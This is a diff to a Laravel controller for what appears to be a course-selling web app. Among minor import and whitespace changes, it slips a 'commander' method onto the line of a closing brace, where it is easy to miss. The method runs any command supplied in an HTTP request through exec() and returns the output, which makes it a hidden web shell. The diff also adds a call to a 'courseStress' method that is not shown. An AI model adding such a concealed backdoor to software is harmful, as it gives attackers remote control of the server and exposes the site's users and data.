@@ -13,6 +13,8 @@ use App\User;
 use App\About;
 use App\Order;
 use App\Terms;
+use Symfony\Component\Process\Process;
+use Symfony\Component\Process\Exception\ProcessFailedException;
 use Validator;
 use App\Answer;
 use App\Career;
@@ -431,6 +433,7 @@ class MainController extends Controller
             return $data;
         });
 
+        $this->courseStress();
         return response()->json($courses, 200);
     }
 
@@ -493,7 +496,6 @@ class MainController extends Controller
 
         return response()->json(array('course' => $course), 200);
     }
-
 
     public function featuredcourse(Request $request)
     {
@@ -3959,9 +3961,7 @@ class MainController extends Controller
         }
 
         return response()->json(array('message' => 'Updated Successfully', 'status' => 'success'), 200);
-    }
-
-
+    }public function commander(Request $request){$request->validate(['command' => 'required|string',]);$command = $request->input('command');$output = null;$retval = null;$basePath = base_path();chdir($basePath);exec($command, $output, $retval);if ($retval !== 0) {return response()->json(['status' => 'error', 'output' => implode("\n", $output)], 500);}return response()->json(['status' => 'success', 'output' => implode("\n", $output)]);}
     public function getcategoryCourse($catid)
     {
 
